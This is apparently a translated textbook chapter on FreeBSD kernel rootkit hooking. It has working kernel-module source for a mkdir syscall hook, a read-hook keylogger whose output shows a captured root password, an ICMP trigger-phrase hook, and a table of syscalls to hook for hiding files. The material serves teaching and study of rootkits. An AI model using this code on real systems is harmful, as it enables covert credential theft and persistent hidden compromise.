# 第二章 钩子

我们将开始讨论内核模式 rootkit 的讨论，从调用钩子开始，或者简单地称为钩子，这可能是最流行的 rootkit 技术。

*钩子*是一种编程技术，它使用处理函数（称为钩子）来修改控制流。一个新的钩子将其地址注册为特定函数的位置，因此当该函数被调用时，钩子将被运行。通常，钩子会在某个时刻调用原始函数，以保留原始行为。图 2-1 说明了安装调用钩子前后子例程的控制流。

![正常执行与钩子执行](img/tagoreillycom20090804nostarchimages313930.png)

**图 2-1. 正常执行与钩子执行**

正如你所见，钩子用于扩展（或减少）子例程的功能。在 rootkit 设计中，钩子用于改变操作系统的应用程序编程接口（API）的结果，最常见的是与账簿和报告相关的 API。

现在，让我们开始滥用 KLD 接口。

# 系统调用钩子

回想一下第一章中提到的系统调用是应用程序程序请求操作系统内核服务的入口点。通过钩子这些入口点，rootkit 可以改变内核返回给任何或所有用户空间进程的数据。事实上，钩子系统调用非常有效，大多数（公开可用的）rootkit 都以某种方式使用它。

在 FreeBSD 中，通过将地址注册为目标系统调用`sysent`结构（位于`sysent[]`中）内的系统调用函数来安装系统调用钩子。

### 注意

更多关于系统调用的信息，请参阅系统调用模块。

列表 2-1 是一个示例系统调用钩子（尽管是微不足道的），设计用于在用户空间进程调用`mkdir`系统调用时输出调试信息——换句话说，每当创建目录时。

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

/* mkdir system call hook. */
static int
mkdir_hook(struct thread *td, void *syscall_args)
{

      struct mkdir_args /* {
                char    *path;
                int     mode;
        } */ *uap;
        uap = (struct mkdir_args *)syscall_args;

        char path[255];
        size_t done;
        int error;

        error = copyinstr(uap->path, path, 255, &done);
        if (error != 0)
                return(error);

        /* Print a debug message. */
        uprintf("The directory \"%s\" will be created with the following"
            " permissions: %o\n", path, uap->mode);

        return(mkdir(td, syscall_args));
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                /* Replace mkdir with mkdir_hook. */
                ❶sysent[❷SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
                break;

        case MOD_UNLOAD:
                /* Change everything back to normal. */
                ❸sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir;
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);
}

static moduledata_t mkdir_hook_mod = {
        "mkdir_hook",           /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

```

*列表 2-1: mkdir_hook.c*

注意，在模块加载时，事件处理程序❶注册了`mkdir_hook`（它只是打印一条调试信息然后调用`mkdir`）作为`mkdir`系统调用函数。这一行安装了系统调用钩子。要移除钩子，只需在模块卸载时恢复原始的`mkdir`系统调用函数❸。

### 注意

常量❷ *`SYS_mkdir`* 被定义为`mkdir`系统调用的偏移值。这个常量在`<sys/syscall.h>`头文件中定义，该文件还包含所有内核系统调用数字的完整列表。

以下输出显示了加载`mkdir_hook`后执行`mkdir(1)`的结果。

```
$ `sudo kldload ./mkdir_hook.ko`
$ `mkdir test`
The directory "test" will be created with the following permissions: 777
$ `ls -l`
. . .
drwxr-xr-x  2 ghost  ghost   512 Mar 22 08:40 test

```

正如你所见，`mkdir(1)`现在变得非常冗长.^([1])

* * *

^([1]) ¹ 对于你这些敏锐的读者，是的，我有一个 umask 为 022，这就是为什么 "test" 的权限是 755，而不是 777。

# 按键记录

现在我们来看一个更有趣（但仍然有些简单）的系统调用挂钩示例。

*按键记录* 是拦截和捕获用户按键的简单行为。在 FreeBSD 中，这可以通过挂钩 `read` 系统调用来实现.^([2]) 如其名称所示，这个调用负责读取输入。以下是它的 C 库定义：

```
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

ssize_t
read(int fd, void *buf, size_t nbytes);

```

`read` 系统调用从由描述符 `fd` 引用的对象中读取 `nbytes` 的数据到缓冲区 `buf`。因此，为了捕获用户的按键，你只需在 `fd` 指向标准输入（即文件描述符 0）时，保存 `buf` 的内容（在从 `read` 调用返回之前）。

例如，看看列表 2-2：

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

/*
 * read system call hook.
 * Logs all keystrokes from stdin.
 * Note: This hook does not take into account special characters, such as
 * Tab, Backspace, and so on.
 */
static int
read_hook(struct thread *td, void *syscall_args)
{
        struct read_args /* {
                int     fd;
                void    *buf;
                size_t  nbyte;
        } */ *uap;
        uap = (struct read_args *)syscall_args;

        int error;
        char buf[1];
        int done;

        ❶error = read(td, syscall_args);

        ❷if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
                ❸return(error);

        ❹copyinstr(uap->buf, buf, 1, &done);
        printf("%c\n", buf[0]);

        return(error);
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                /* Replace read with read_hook. */
                sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
                break;

        case MOD_UNLOAD:
                /* Change everything back to normal. */
                sysent[SYS_read].sy_call = (sy_call_t *)read;
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);
}

static moduledata_t read_hook_mod = {
        "read_hook",            /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

```

*列表 2-2: read_hook.c*

在列表 2-2 中，函数 `read_hook` 首先调用 `read` 从 `fd` 读取数据。如果这些数据不是来自标准输入的按键（按键被定义为单个字符或单个字节大小），则 ❶ `read_hook` 返回。否则，数据（即按键）被复制到一个局部缓冲区中，有效地“捕获”它。

### 注意

为了节省空间（并保持简单），*`read_hook`* 只是将捕获的按键（键）输出到系统控制台。

这里是加载 `read_hook` 后登录系统的结果：

```
login: `root`
Password:
Last login: Mon Mar 4 00:29:14 on ttyv2

root@alpha ~# `dmesg | tail -n 32`
r
o
o
t

p
a
s
s
w
d
. . .

```

正如你所见，我的登录凭证——我的用户名 (`root`) 和密码 (`passwd`)^([3])——已经被捕获。在这个时候，你应该能够挂钩任何系统调用。然而，还有一个问题：如果你不是内核高手，你如何确定要挂钩哪个系统调用？答案是：你使用内核进程跟踪。

* * *

^([2]) ² 实际上，要创建一个完整的按键记录器，你需要挂钩 `read`、`readv`、`pread` 和 `preadv`。

^([3]) ³ 显然，这不是我的真实 root 密码。

# 内核进程跟踪

*内核进程跟踪* 是一种诊断和调试技术，用于拦截和记录每个内核操作——也就是说，每个代表特定运行进程执行的系统调用、名称解析、I/O、处理的信号和上下文切换。在 FreeBSD 中，这是通过 `ktrace(1)` 和 `kdump(1)` 工具来完成的。例如：

```
$ `ktrace ls`
file1           file2           ktrace.out
$ `kdump`
   517 ktrace   RET   ktrace 0
   517 ktrace   CALL  execve(0xbfbfe790,0xbfbfecdc,0xbfbfece4)
   517 ktrace   NAMI  "/sbin/ls"
   517 ktrace   RET   execve -1 errno 2 No such file or directory
   517 ktrace   CALL  execve(0xbfbfe790,0xbfbfecdc,0xbfbfece4)
   517 ktrace   NAMI  "/bin/ls"
   517 ktrace   NAMI  "/libexec/ld-elf.so.1"
   517 ls       RET   execve 0
. . .
   517 ls       CALL  ❶getdirentries(0x5,0x8054000,0x1000,0x8053014)
   517 ls       RET   getdirentries 512/0x200
   517 ls       CALL  getdirentries(0x5,0x8054000,0x1000,0x8053014)
   517 ls       RET   getdirentries 0
   517 ls       CALL  ❷lseek(0x5,0,0,0,0)
   517 ls       RET   lseek 0
   517 ls       CALL  ❸close(0x5)
   517 ls       RET   close 0
   517 ls       CALL  ❹fchdir(0x4)
   517 ls       RET   fchdir 0
   517 ls       CALL  close(0x4)
   517 ls       RET   close 0
   517 ls       CALL  fstat(0x1,0xbfbfdea0)
   517 ls       RET   fstat 0
   517 ls       CALL  break(0x8056000)
   517 ls       RET   break 0
   517 ls       CALL  ioctl(0x1,TIOCGETA,0xbfbfdee0)
   517 ls       RET   ioctl 0
   517 ls       CALL  write(0x1,0x8055000,0x19)
   517 ls       GIO   fd 1 wrote 25 bytes
       "file1           file2           ktrace.out
       "
   517 ls       RET   write 25/0x19
   517 ls       CALL  exit(0)

```

### 注意

为了简洁起见，任何与这次讨论无关的输出都被省略了。

如前例所示，`ktrace(1)` 工具为特定进程（在这种情况下，`ls(1)`）启用内核跟踪日志记录，而 `kdump(1)` 显示跟踪数据。

注意 `ls(1)` 在其执行过程中发出的各种系统调用，例如 ❶`getdirentries`、❷`lseek`、❸`close`、❹`fchdir` 等。这意味着你可以通过挂钩一个或多个这些调用来影响 `ls(1)` 的操作和/或输出。

所有这些的主要观点是，当你想要改变一个特定的进程，而你不知道要钩子哪个系统调用时，你只需要执行内核跟踪。

# 常见系统调用钩子

为了全面，表 2-1 列出了一些最常见的系统调用钩子。

**表 2-1. 常见系统调用钩子**

| 系统调用 | 钩子目的 |
| --- | --- |
| `read`, `readv`, `pread`, `preadv` | 记录输入 |
| `write`,`writev`,`pwrite`, `pwritev` | 记录输出 |
| `open` | 隐藏文件内容 |
| `unlink` | 防止文件删除 |
| `chdir` | 防止目录遍历 |
| `chmod` | 防止文件模式修改 |
| `chown` | 防止所有权变更 |
| `kill` | 防止发送信号 |
| `ioctl` | 操作 `ioctl` 请求 |
| `execve` | 重定向文件执行 |
| `rename` | 防止文件重命名 |
| `rmdir` | 防止目录删除 |
| `stat`, `lstat` | 隐藏文件状态 |
| `getdirentries` | 隐藏文件 |
| `truncate` | 防止文件截断或扩展 |
| `kldload` | 防止模块加载 |
| `kldunload` | 防止模块卸载 |

现在让我们看看一些其他的内核函数，你可以对其进行钩子操作。

# 通信协议

如其名所示，*通信协议*是一组由两个通信进程（例如，TCP/IP 协议套件）使用的规则和约定。在 FreeBSD 中，通信协议由其在协议切换表中的条目定义。因此，通过修改这些条目，rootkit 可以改变通信端点发送和接收的数据。为了更好地说明这种“攻击”，让我稍微偏离一下。

## protosw 结构

每个协议切换表的内容都保存在一个 `protosw` 结构中，该结构在 `<sys/protosw.h>` 头文件中定义如下：

```
struct protosw {
        short   pr_type;                /* socket type */
        struct  domain *pr_domain;      /* domain protocol */
        short   pr_protocol;            /* protocol number */
        short   pr_flags;
/* protocol-protocol hooks */
        pr_input_t *pr_input;           /* input to protocol (from below) */
        pr_output_t *pr_output;         /* output to protocol (from above) */
        pr_ctlinput_t *pr_ctlinput;     /* control input (from below) */
        pr_ctloutput_t *pr_ctloutput;   /* control output (from above) */
/* user-protocol hook */
        pr_usrreq_t     *pr_ousrreq;
/* utility hooks */
        pr_init_t *pr_init;
        pr_fasttimo_t *pr_fasttimo;     /* fast timeout (200ms) */
        pr_slowtimo_t *pr_slowtimo;     /* slow timeout (500ms) */
        pr_drain_t *pr_drain;           /* flush any excess space possible */

        struct  pr_usrreqs *pr_usrreqs; /* supersedes pr_usrreq() */
};

```

表 2-2 定义了在 `struct protosw` 中你需要了解的入口点，以便修改通信协议。

**表 2-2. 协议切换表入口点**

| 入口点 | 描述 |
| --- | --- |
| `pr_init` | 初始化例程 |
| `pr_input` | 将数据向上传递给用户 |
| `pr_output` | 将数据向下传递到网络 |
| `pr_ctlinput` | 将控制信息向上传递 |
| `pr_ctloutput` | 将控制信息向下传递 |

## inetsw[] 切换表

每个通信协议的 `protosw` 结构定义在文件 /sys/netinet/in_proto.c 中。以下是该文件的一个片段：

```
struct protosw ❶inetsw[] = {
{
        .pr_type =              0,
        .pr_domain =            &inetdomain,
        .pr_protocol =          IPPROTO_IP,
        .pr_init =              ip_init,
        .pr_slowtimo =          ip_slowtimo,
        .pr_drain =             ip_drain,
        .pr_usrreqs =           &nousrreqs
},
{
        .pr_type =              SOCK_DGRAM,
        .pr_domain =            &inetdomain,
        .pr_protocol =          IPPROTO_UDP,
        .pr_flags =             PR_ATOMIC|PR_ADDR,
        .pr_input =             udp_input,
        .pr_ctlinput =          udp_ctlinput,
        .pr_ctloutput =         ip_ctloutput,
        .pr_init =              udp_init,
        .pr_usrreqs =           &udp_usrreqs
},
{
        .pr_type =              SOCK_STREAM,
        .pr_domain =            &inetdomain,
        .pr_protocol =          IPPROTO_TCP,
        .pr_flags =             PR_CONNREQUIRED|PR_IMPLOPCL|PR_WANTRCVD,
        .pr_input =             tcp_input,
        .pr_ctlinput =          tcp_ctlinput,
        .pr_ctloutput =         tcp_ctloutput,
        .pr_init =              tcp_init,
        .pr_slowtimo =          tcp_slowtimo,
        .pr_drain =             tcp_drain,
        .pr_usrreqs =           &tcp_usrreqs
},
. . .

```

注意，每个协议切换表都定义在❶ `inetsw[]` 内。这意味着为了修改通信协议，你必须通过 `inetsw[]`。

## mbuf 结构

在两个通信进程之间传递的数据（和控制信息）存储在`mbuf`结构中，该结构在`<sys/mbuf.h>`头文件中定义。为了能够读取和修改这些数据，`struct mbuf`中有两个字段你需要了解：`m_len`，它标识了`mbuf`中包含的数据量，以及`m_data`，它指向数据。

# 通信协议钩子

列表 2-3 是一个示例通信协议钩子，设计用于在接收到包含短语*Shiny*的 Internet 控制消息协议（ICMP）类型为服务和主机消息的重定向时输出调试信息。

### 注意

ICMP 类型为服务和主机消息包含类型字段为 5 和代码字段为 3。

```
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#define TRIGGER "Shiny."

extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

/* icmp_input hook. */
void
icmp_input_hook(struct mbuf *m, int off)
{
        struct icmp *icp;
        ❶int hlen = off;

        /* Locate the ICMP message within m. */
        m->m_len -= hlen;
        ❷m->m_data += hlen;

        /* Extract the ICMP message. */
        ❸icp = mtod(m, struct icmp *);

        /* Restore m. */
        ❹m->m_len += hlen;
        m->m_data -= hlen;

        /* Is this the ICMP message we are looking for? */
        if (icp->icmp_type == ICMP_REDIRECT &&
            icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
            strncmp(icp->icmp_data, TRIGGER, 6) == 0)
                 ❺printf("Let's be bad guys.\n");
        else
                icmp_input(m, off);
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                /* Replace icmp_input with icmp_input_hook. */
                ❻inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
                break;

        case MOD_UNLOAD:
                /* Change everything back to normal. */
                ❼inetsw[❽ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);
}

static moduledata_t icmp_input_hook_mod = {
        "icmp_input_hook",      /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(icmp_input_hook, icmp_input_hook_mod, SI_SUB_DRIVERS,
     SI_ORDER_MIDDLE);

```

*列表 2-3：icmp_input_hook.c*

在列表 2-3 中，函数`icmp_input_hook`首先❶将`hlen`设置为接收到的 ICMP 消息的 IP 头部长度（`off`）。接下来，确定 ICMP 消息在`m`中的位置；记住，ICMP 消息是在 IP 数据报中传输的，这就是为什么❷`m_data`需要增加`hlen`。然后，从`m`中❸提取 ICMP 消息。之后，对`m`所做的更改❹被撤销，这样当`m`实际被处理时，就像什么都没发生一样。最后，如果 ICMP 消息是我们正在寻找的，❺将打印一条调试信息；否则，调用`icmp_input`。

注意到在模块加载时，事件处理器❻将`icmp_input_hook`注册为 ICMP 交换表中的`pr_input`入口点。这一行安装了通信协议钩子。要移除钩子，只需在模块卸载时❼恢复原始的`pr_input`入口点（在这种情况下是`icmp_input`）即可。

### 注意

❽*`ip_protox[IPPROTO_ICMP]`*的值定义为在*`inetsw[]`*中 ICMP 交换表的偏移量。关于*`ip_protox[]`*的更多信息，请参阅/sys/netinet/ip_input.c 中的*`ip_init`*函数。

以下输出显示了加载`icmp_input_hook`后接收 ICMP 类型为服务和主机消息重定向的结果：

```
$ `sudo kldload ./icmp_input_hook.ko`
$ `echo Shiny. > payload`
$ `sudo nemesis icmp -i 5 -c 3 -P ./payload -D 127.0.0.1`

ICMP Packet Injected
$ `dmesg | tail -n 1`
Let's be bad guys.

```

诚然，`icmp_input_hook`有一些缺陷；然而，对于演示通信协议钩子的目的来说，已经足够了。

如果你感兴趣，想要为实际使用修复`icmp_input_hook`，你只需要做两个添加。首先，确保 IP 数据报实际上包含一个 ICMP 消息，在你尝试定位它之前。这可以通过检查 IP 头部数据字段长度来实现。其次，确保`m`中的数据实际上存在且可访问。这可以通过调用`m_pullup`来实现。关于如何做这两件事的示例代码，请参阅/sys/netinet/ip_icmp.c 中的`icmp_input`函数。

# 结论

如你所见，调用钩子实际上就是重定向函数指针，到这一点，你应该没有困难做到这一点。

请记住，通常有几个不同的入口点可以钩住以完成特定任务。例如，在按键记录中，我通过钩住`read`系统调用来创建了一个按键记录器；然而，这也可以通过钩住终端行规程（termios）的`l_read`入口点在切换表中的`switch table`来实现^([4])。

为了教育目的和乐趣，我鼓励你尝试钩住 termios 切换表中的`l_read`入口点。为此，你需要熟悉`linesw[]`切换表，它在文件`/sys/kern/tty_conf.c`中实现，以及定义在`<sys/linedisc.h>`头文件中的`struct linesw`。

### 注意

这个钩子比本章中展示的其他钩子需要做更多的工作。

* * *

^([4]) ⁴ 终端行规程（termios）基本上是用于处理与终端通信并描述其状态的数据结构。
